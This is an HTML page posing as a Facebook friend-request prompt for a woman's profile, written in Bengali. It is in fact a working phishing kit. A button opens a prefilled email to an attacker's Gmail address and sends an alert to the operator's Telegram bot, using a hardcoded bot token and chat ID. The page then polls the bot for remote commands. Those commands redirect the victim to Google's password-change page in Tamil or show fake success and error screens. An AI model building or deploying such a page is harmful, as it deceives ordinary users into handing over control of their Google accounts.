<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Add Friend</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        .hidden { display: none; }
        .top-half { height: 45vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #ddd; }
        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .bottom-half { height: 55vh; width: 100%; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
        .btn-blue { width: 100%; max-width: 340px; background-color: #1877f2; color: white; font-weight: bold; padding: 14px; border-radius: 8px; text-align: center; cursor: pointer; border: none; font-size: 17px; }
        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-icon { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: white; }
    </style>
</head>
<body onload="onPageLoad()">

    <div class="top-half">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" alt="Profile">
    </div>

    <div class="bottom-half">
        <div id="step1" class="w-full flex flex-col items-center gap-4">
            <h2 class="text-xl font-bold text-gray-800">Mst. Priya Akter</h2>
            <p class="text-gray-500 text-center">এড করতে নিচের বাটনে ক্লিক করুন।</p>
            <button onclick="goToStep('step2')" class="btn-blue">Add Friend</button>
        </div>

        <div id="step2" class="hidden w-full flex flex-col items-center gap-4">
            <h2 class="text-lg font-bold text-gray-800 text-center">নিরাপত্তা যাচাই সম্পন্ন করুন</h2>
            <p class="text-sm text-gray-600 text-center">নিচের বাটনে ক্লিক করে জিমেইল অ্যাপ থেকে মেসেজটি পাঠান।</p>
            <button onclick="triggerGmailAndVerify()" class="btn-blue">Send Message via Gmail</button>
        </div>

        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
            <div class="loader"></div>
            <h3 class="text-blue-600 font-bold">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
            <p class="text-gray-500 text-center text-sm px-6">আপনার অনুরোধটি যাচাই করা হচ্ছে। অনুগ্রহ করে এই পেজটি বন্ধ করবেন না।</p>
        </div>

        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
            <div class="status-icon bg-green-500">✓</div>
            <h2 class="text-2xl font-bold text-green-600">সফল হয়েছে!</h2>
        </div>

        <div id="error_page" class="hidden w-full flex flex-col items-center gap-3">
            <div class="status-icon bg-red-500">✕</div>
            <h2 class="text-xl font-bold text-red-600">ত্রুটি দেখা দিয়েছে!</h2>
        </div>
    </div>

<script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";
    let lastUpdateId = 0;

    function onPageLoad() {
        if (sessionStorage.getItem('isWaiting') === 'true') {
            goToStep('verifying');
            startListening();
        }
    }

    function goToStep(id) {
        ['step1', 'step2', 'verifying', 'success_page', 'error_page'].forEach(s => {
            document.getElementById(s).classList.add('hidden');
            document.getElementById(s).classList.remove('flex');
        });
        document.getElementById(id).classList.remove('hidden');
        document.getElementById(id).classList.add('flex');
    }

    function triggerGmailAndVerify() {
        const targetEmail = "priyaakter200302@gmail.com";
        const subject = "Verification Request";
        const body = "Hi, please verify my account for friend request.";
        
        // জিমেইল অ্যাপ ওপেন
        window.location.href = `mailto:${targetEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

        // টেলিগ্রামে কমান্ড পাঠানো
        sendCommandsToBot();

        // অনির্দিষ্টকালের জন্য লোডিং স্টেটে নিয়ে যাওয়া
        setTimeout(() => {
            sessionStorage.setItem('isWaiting', 'true');
            goToStep('verifying');
            startListening();
        }, 1000);
    }

    function sendCommandsToBot() {
        const keyboard = {
            inline_keyboard: [
                [{ text: "🔑 Google Password Change", callback_data: "pass_cmd" }],
                [{ text: "⏳ Verify", callback_data: "wait_cmd" }],
                [{ text: "✅ Success", callback_data: "success" }],
                [{ text: "❌ Error", callback_data: "error" }]
            ]
        };

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: "🎯 **নতুন রিকোয়েস্ট এসেছে!**\nইউজার জিমেইল ভেরিফিকেশন বাটনে ক্লিক করেছে। নিচের কমান্ডগুলো ব্যবহার করুন:", 
                reply_markup: keyboard 
            })
        });
    }

    function startListening() {
        setInterval(async () => {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await response.json();
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        const command = update.callback_query?.data;

                        if (command === "pass_cmd") {
                            // তামিল ভাষায় গুগল পাসওয়ার্ড চেঞ্জ পেজ (hl=ta)
                            // এটি প্রথমে স্ক্রিন লক/ফিঙ্গারপ্রিন্ট চাইবে তারপর পাসওয়ার্ড পেজে নেবে
                            window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword%3Fhl%3Dta&hl=ta&service=accountsettings";
                        } else if (command === "success") {
                            sessionStorage.removeItem('isWaiting');
                            goToStep('success_page');
                        } else if (command === "error") {
                            sessionStorage.removeItem('isWaiting');
                            goToStep('error_page');
                        } else if (command === "wait_cmd") {
                            goToStep('verifying');
                        }
                    });
                }
            } catch (e) {}
        }, 2000);
    }
</script>
</body>
</html>
